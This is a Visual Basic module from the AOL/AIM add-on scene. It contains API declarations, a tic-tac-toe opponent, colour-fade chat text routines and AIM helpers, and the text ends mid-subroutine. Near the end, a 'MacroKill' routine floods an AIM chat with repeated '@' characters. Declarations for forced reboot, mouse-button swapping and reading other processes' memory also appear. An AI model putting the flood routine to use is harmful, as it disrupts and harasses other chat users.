Attribute VB_Name = "BLiZzaRD"
'          — ——• BLiZzaRD.bas by -TRiPP- a.k.a NoVa- •—— —             '
























'This is My 1st Module
'The biggest bas ever made....1306 Subs and Functions
'--If you make any programs with this please
'email them to me i would like to see them--
'--AND, If You Have Any Ideas For My Next Bas
'Or Suggestions, and Comments, or Errors Email Me--


'!-#* If you have a web site please post this *#-!'


'Runs In  :   Vb 4-6
'For AoL  :   2.5, 3.o, 95, 4.0, 5.0, 6.0, and 7.0 + AiM!!
'The First module with aim fades!@#
'Email    :   thismightbetripp@aol.com
'Codes    :   Included
'This bas is like a help file, read the
'how to section, and the programming section
'(They are at the Bottom, The Very Bottom)
'I was told to give cryofade some credit
'So you have credit!#-#, (for the original fade idea)
'(and credit to tko for pointing that out, heh)

'Greets :
              
              'Gods Hate
        'WeMiC                    'cro0k
  'Co0lz                       'Tko
                 'big mac
        'nls                 'Meth Chic
 'Mel          'Baud
                                      'Qo0
   'basic                     'TRaGiC
            'dub
                  'reset
    'PiKe
                      'Vb ALien
    'h2o                          'Acid Burn
           'Super hi
                       'QOX
             'FRoZeN               'Skorch
 'Mizi
        'tri0                 '911
                'syn            'TeKno
        'VooDoo      'Absent      'null
                    'Peace            'Amcl
    'Iota god                  'numb
               'Bong        'turkey
                       'Clone            'hider
              'Fear
    'Lazerous            'Ginn             'k9
                'Joe               'Flee
     'HiDe               'Flea             'Dell
          'Progee
                            'UNiX
       'RaJ      'Thugz
                           'Thorn            'CaS
   'BuRnT                            'error
             'Sword
                                   'cyze
    'Glitch           'Geezus
            'James
                                   'heroin hi
      'DoS                     'Sod
                'KeV
            'ksoc         'KoRn
        
        'mist                     'ninja
                       'paper             'hydro
                'illy
    'warpy                 'bob      'red
              'hiya
                        'nitro
        'Leet Speed                 'dryice
                
                'And His Poser ieet Speed
                          
'If I Forgot Anyone Email Me and ill Put You In
                'The Next One

'                                     —TRiPP-



























































































































'Nobody likes a code stealer ;\
'========================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================BliZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
'BliZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
Public RoomHandle%
Declare Function SetWindowPos& Lib "user32" (ByVal hwnd&, ByVal hWndInsertAfter&, ByVal x&, ByVal Y&, ByVal cx&, ByVal cy&, ByVal wFlags&) 'BliZzaRD.bas by TRiPP Email:Thismightbetripp@@aol.com
Declare Function FindWindow% Lib "user32" Alias "FindWindowA" (ByVal lpClassName$, ByVal lpWindowName$)
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long 'BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
Declare Function SenditByString& Lib "user32" Alias "SendMessageA" (ByVal hwnd&, ByVal wMsg&, ByVal wParam&, ByVal lParam$)
Declare Function SenditbyNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd&, ByVal wMsg&, ByVal wParam&, ByVal lParam&)
Declare Function GetWindow& Lib "user32" (ByVal hwnd&, ByVal wCmd&)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd&, ByVal lpClassName$, ByVal nMaxCount&)
Declare Function GetWindowTextLength& Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd&)
Declare Function GetWindowText& Lib "user32" Alias "GetWindowTextA" (ByVal hwnd&, ByVal lpString$, ByVal cch&)
Public Const WM_CHAR = &H102
Public Const HWND_TOPMOST = -1
Public Const VK_SPACE = &H20
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
Public Const VK_RETURN = &HD
Declare Function ExitWindowsEx Lib "user32" _
(ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Public Const EWX_FORCE = 4
Public Const EWX_REBOOT = 2
Public Const EWX_SHUTDOWN = 1
Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As Any, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long 'BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Declare Function ReleaseDC Lib "user" (ByVal hwnd%, ByVal hDC%) As Integer
Declare Function GetWindowDC Lib "user" (ByVal hwnd As Integer) As Integer
Declare Function SwapMouseButton% Lib "user" (ByVal bSwap%)
Declare Function ENumChildWindow% Lib "user" (ByVal hWndParent%, ByVal lpEnumFunc&, ByVal lParam&)
Declare Function FillRect Lib "user" (ByVal hDC As Integer, lpRect As RECT, ByVal hBrush As Integer) As Integer
Declare Function GetDC Lib "user" (ByVal hwnd%) As Integer
Declare Function CreateSolidBrush Lib "GDI" (ByVal crColor As Long) As Integer
Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long 'BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
'BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal x As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long 'BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function GetWindowLong& Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long)
'BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
Public Declare Function FindWindowChild Lib "user32" Alias "FindWindowChildA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare Function SetKeyboardState Lib "user32" (lppbKeyState As Byte) As Long
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Long) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal Y As Long) As Long
Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SelectObject Lib "GDI" (ByVal hDC As Integer, ByVal hObject As Integer) As Integer
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function gettopwindow Lib "user32" Alias "GetTopWindow" (ByVal hwnd As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long 'Sehnsucht.bas by: meeh Email:thismightbetripp@aol.com
Declare Sub Rectangle Lib "GDI" (ByVal hDC As Integer, ByVal X1 As Integer, ByVal Y1 As Integer, ByVal X2 As Integer, ByVal Y2 As Integer)
Declare Sub DeleteObject Lib "GDI" (ByVal hObject As Integer)
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source&, ByVal dest&, ByVal nCount&)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal source As String, ByVal dest As Long, ByVal nCount&)
Declare Sub ReleaseCapture Lib "user32" ()

Global Const GFSR_SYSTEMRESOURCES = 0
Global Const GFSR_GDIRESOURCES = 1
Global Const GFSR_USERRESOURCES = 2

Global Const WM_MDICREATE = &H220
Global Const WM_MDIDESTROY = &H221
Global Const WM_MDIACTIVATE = &H222
Global Const WM_MDIRESTORE = &H223
Global Const WM_MDINEXT = &H224
Global Const WM_MDIMAXIMIZE = &H225
Global Const WM_MDITILE = &H226
Global Const WM_MDICASCADE = &H227
Global Const WM_MDIICONARRANGE = &H228
Global Const WM_MDIGETACTIVE = &H229
Global Const WM_MDISETMENU = &H230

Public Const WM_SYSCOMMAND = &H112
Global Const WM_CUT = &H300
Global Const WM_COPY = &H301
Global Const WM_PASTE = &H302
Public Const WM_SETTEXT = &HC
Public Const WM_USER = &H400
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_CLOSE = &H10
Public Const WM_COMMAND = &H111
Public Const WM_CLEAR = &H303
Public Const WM_DESTROY = &H2
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_LBUTTONDBLCLK = &H203
Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3

Public Const SC_MOVE = &HF012

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F

Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181
'BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4
Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&
Public Const NUM_SQUARES = 9
Public Board(1 To NUM_SQUARES) As Integer
Public GameInProgress As Integer
Public Const PLAYER_DRAW = -1
Public Const PLAYER_NONE = 0
Public Const PLAYER_HUMAN = 1
Public Const PLAYER_COMPUTER = 2
Public Const NUM_PLAYERS = 2

Public NextPlayer As Integer
Public PlayerX As Integer
Public PlayerO As Integer

Public SkillLevel As Integer
Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)
Public Const GWL_STYLE = (-16)
'BLiZzaRD.bas by TRiPP Email:thismightbetripp@aol.com
Public Const PROCESS_VM_READ = &H10

Type RECT
   Left As Long
   Top As Long
   Right As Long
   Bottom As Long
End Type

Type POINTAPI
   x As Long
   Y As Long
End Type


 
Public Function PickComputerMove()
Dim pick As Integer


Select Case SkillLevel
   
   Case 1
  
  
     PickComputerMove = MakeRandomMove
     Exit Function
    
   
  
   Case 2
   
       pick = MakeWinningMove
      
          If pick = 0 Then
             pick = MakeSavingMove
          Else
             PickComputerMove = pick
             Exit Function
          End If
  
      
          If pick = 0 Then
             PickComputerMove = MakeRandomMove
          Else
             PickComputerMove = pick
          End If
      
  
  
   Case 3
  
    pick = MakeWinningMove
        
      
      If pick = 0 Then
         pick = MakeSavingMove
      Else
         PickComputerMove = pick
         Exit Function
      End If
  
      
      If pick = 0 Then
         pick = MakeSavingMove2
      Else
         PickComputerMove = pick
         Exit Function
      End If
    
    
      If pick = 0 Then
         PickComputerMove = MakeStandardMove
      Else
         PickComputerMove = pick
      End If
    
End Select

End Function


Public Function MakeStandardMove() As Integer

Dim Square As Integer
Dim pick As Integer
    
  If Board(5) = PLAYER_NONE Then
     MakeStandardMove = 5
     Exit Function
  End If


  For Square = 1 To 9 Step 2
     
     If Board(Square) = PLAYER_NONE Then
        
        MakeStandardMove = Square
        Exit Function
     
     End If

  Next



  
  For Square = 2 To 8 Step 2

    If Board(Square) = PLAYER_NONE Then
        
        MakeStandardMove = Square
        Exit Function
    
    End If

  Next




End Function

Public Function MakeWinningMove() As Integer


Dim computersquares As Integer
Dim freesquare As Integer
Dim Square As Integer
Dim i As Integer
 
 
 
For Square = 1 To 7 Step 3
    
  computersquares = 0
  freesquare = 0
 
    For i = 0 To 2
        
        Select Case Board(Square + i)
            
            Case PLAYER_COMPUTER
                 computersquares = computersquares + 1
            
            Case PLAYER_NONE
                 freesquare = Square + i
        
        End Select
    
    Next
    
    If computersquares = 2 And freesquare <> 0 Then
        
           MakeWinningMove = freesquare
           Exit Function
    
    End If
  
Next
  
For Square = 1 To 3
    
  computersquares = 0
  freesquare = 0
 
    For i = 0 To 6 Step 3
        
        Select Case Board(Square + i)
            
            Case PLAYER_COMPUTER
                 computersquares = computersquares + 1
            Case PLAYER_NONE
                 freesquare = Square + i
        
        End Select
    
    Next
        
    If computersquares = 2 And freesquare <> 0 Then
       
       MakeWinningMove = freesquare
       Exit Function
    
    End If
    
Next
  
  computersquares = 0
  freesquare = 0
      
For i = 1 To 9 Step 4
        
        Select Case Board(i)
            
            Case PLAYER_COMPUTER
                 computersquares = computersquares + 1
            Case PLAYER_NONE
                 freesquare = i
        End Select
    
    Next
        
    If computersquares = 2 And freesquare <> 0 Then
       MakeWinningMove = freesquare
       Exit Function
    End If
    
  
  computersquares = 0
  freesquare = 0
     
    For i = 3 To 7 Step 2
        
        Select Case Board(i)
            Case PLAYER_COMPUTER
                 computersquares = computersquares + 1
            Case PLAYER_NONE
                 freesquare = i
        End Select
    
    Next
        
    If computersquares = 2 And freesquare <> 0 Then
       MakeWinningMove = freesquare
       Exit Function
    End If
    
End Function

Public Function MakeSavingMove() As Integer

Dim humansquares As Integer
Dim freesquare As Integer
Dim Square As Integer
Dim i As Integer
  For Square = 1 To 7 Step 3
    
  humansquares = 0
  freesquare = 0
 
    For i = 0 To 2
        Select Case Board(Square + i)
            Case PLAYER_HUMAN
                 humansquares = humansquares + 1
            Case PLAYER_NONE
                 freesquare = Square + i
        End Select
    
    Next
    
    If humansquares = 2 And freesquare <> 0 Then
           MakeSavingMove = freesquare
           Exit Function
    End If
  
  Next
  For Square = 1 To 3
    
  humansquares = 0
  freesquare = 0
 
    For i = 0 To 6 Step 3
        
        Select Case Board(Square + i)
            Case PLAYER_HUMAN
                 humansquares = humansquares + 1
            Case PLAYER_NONE
                 freesquare = Square + i
        End Select
    
    Next
        
    If humansquares = 2 And freesquare <> 0 Then
       MakeSavingMove = freesquare
       Exit Function
    End If
    
    
  Next
  
  humansquares = 0
  freesquare = 0
      
    For i = 1 To 9 Step 4
        
        Select Case Board(i)
            Case PLAYER_HUMAN
                 humansquares = humansquares + 1
            Case PLAYER_NONE
                 freesquare = i
        End Select
    
    Next
        
    If humansquares = 2 And freesquare <> 0 Then
       MakeSavingMove = freesquare
       Exit Function
    End If
    
  
  humansquares = 0
  freesquare = 0
     
    For i = 3 To 7 Step 2
        
        Select Case Board(i)
            Case PLAYER_HUMAN
                 humansquares = humansquares + 1
            Case PLAYER_NONE
                 freesquare = i
        End Select
    
    Next
        
    If humansquares = 2 And freesquare <> 0 Then
       MakeSavingMove = freesquare
       Exit Function
    End If
    
End Function

Public Function MakeSavingMove2() As Integer
Dim pick As Integer

Select Case Board(5) = PLAYER_HUMAN
   Case True

       If Board(1) = PLAYER_HUMAN Then
  
            If Board(7) = PLAYER_NONE Then
              pick = 7
            ElseIf Board(4) = PLAYER_NONE Then
              pick = 4
            End If

       ElseIf Board(3) = PLAYER_HUMAN Then
            
            If Board(9) = PLAYER_NONE Then
              pick = 9
            ElseIf Board(6) = PLAYER_NONE Then
              pick = 6
            End If
       
       ElseIf Board(7) = PLAYER_HUMAN Then
            
            If Board(1) = PLAYER_NONE Then
              pick = 1
            ElseIf Board(4) = PLAYER_NONE Then
              pick = 4
            End If
          ElseIf Board(9) = PLAYER_HUMAN Then
            
            If Board(3) = PLAYER_NONE Then
              pick = 3
            ElseIf Board(6) = PLAYER_NONE Then
              pick = 6
            End If
       End If
    End Select
MakeSavingMove2 = pick
End Function


Public Function MakeRandomMove() As Integer

Dim pick As Integer
Dim Square As Integer
Do Until pick <> 0
  Square = Int(Rnd * 8) + 1
 If Board(Square) = PLAYER_NONE Then pick = Square
Loop
MakeRandomMove = pick

End Function

Sub Playwav(dir)
Dim x%
SoundName$ = dir
   wFlags% = SND_ASYNC Or SND_NODEFAULT
   x% = sndPlaySound(SoundName$, wFlags%)
End Sub

Function AoL4_UserSn()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindIt(AOL%, "MDIClient")
SN% = FindItsTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(SN%)
WelcomeTitle$ = String$(200, 0)
meeh% = GetWindowText(SN%, WelcomeTitle$, (WelcomeLength% + 1))
user = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AoL4_UserSn = user
End Function

Function GetClass(Child)
buffer$ = String$(250, 0)
getclas% = GetClassName(Child, buffer$, 250)
GetClass = buffer$
End Function

Function FindIt(parentw, childhand)
Num1% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(Num1%), 1, Len(childhand))) Like UCase(childhand) Then GoTo god
Num1% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(Num1%), 1, Len(childhand))) Like UCase(childhand) Then GoTo god

While Num1%
Num2% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(Num2%), 1, Len(childhand))) Like UCase(childhand) Then GoTo god
Num1% = GetWindow(Num1%, 2)
If UCase(Mid(GetClass(Num1%), 1, Len(childhand))) Like UCase(childhand) Then GoTo god
Wend
FindIt = 0

god:
meeh% = Num1%
FindIt = meeh%
End Function

Sub AoL4_ScrollTxtbox(Txt As TextBox)
meeh$ = Txt.text
Z = 0
Do
Z = Z + 1
newz = InStr(Z, meeh$, Chr(13))
If newz = 0 Then
Module$ = Mid$(meeh$, Z)
Call AoL4_ChatSend(Module$)
Exit Sub
End If
f = newz - Z
leet$ = Mid$(meeh$, Z, f)
If newz <> 0 Then: AoL4_ChatSend (leet$)
Z = newz + 1
Loop
End Sub
Function RGBtoHEX(RGB)
    a = Hex(RGB)
    b = Len(a)
    If b = 5 Then a = "0" & a
    If b = 4 Then a = "00" & a
    If b = 3 Then a = "000" & a
    If b = 2 Then a = "0000" & a
    If b = 1 Then a = "00000" & a
    RGBtoHEX = a
End Function
Function AoL4_BlueYellowBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_BlueYellow(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_BlueRedBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AoL4_BluePurpleBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_BlueRed(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_BluePurple(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_BlueGreenBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_BlueGreen(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_BlueBlackBlue(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_BlueBlack(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_BlackYellowBlack(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function

Function AoL4_BlackYellow(Txt)
    a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ChatSend ("" + Msg + "")
End Function
Function AiM_BoldBlackBlue(Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AiM_ChatSend ("<b>" + Msg + "")
End Function

Sub AiM_GetInfo(Who As String)

Call RunMenuByString(FindWindow("_Oscar_BuddyListWin", vbNullString), "Get Member Inf&o")
Do
ProfileFind% = FindWindow("_Oscar_Locate", vbNullString)
Loop Until CIO1% <> 0
Profile1% = FindIt(ProfileFind%, "_Oscar_PersistantComb")
Profile2% = FindIt(Profile1%, "Edit")
Profile3% = SenditByString(Profile2%, WM_SETTEXT, 0, Who)
Profile4% = FindIt(ProfileFind%, "Button")
Click (Profile4%)
Click (Profile4%)
Profile5% = FindIt(ProfileFind%, "WndAte32Class")
Profile6% = FindIt(Profile5%, "Ate32Class")
End Sub

Sub AiM_MacroKill()
AiM_ChatSend ("<b>@@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@")
TimeOut 0.75
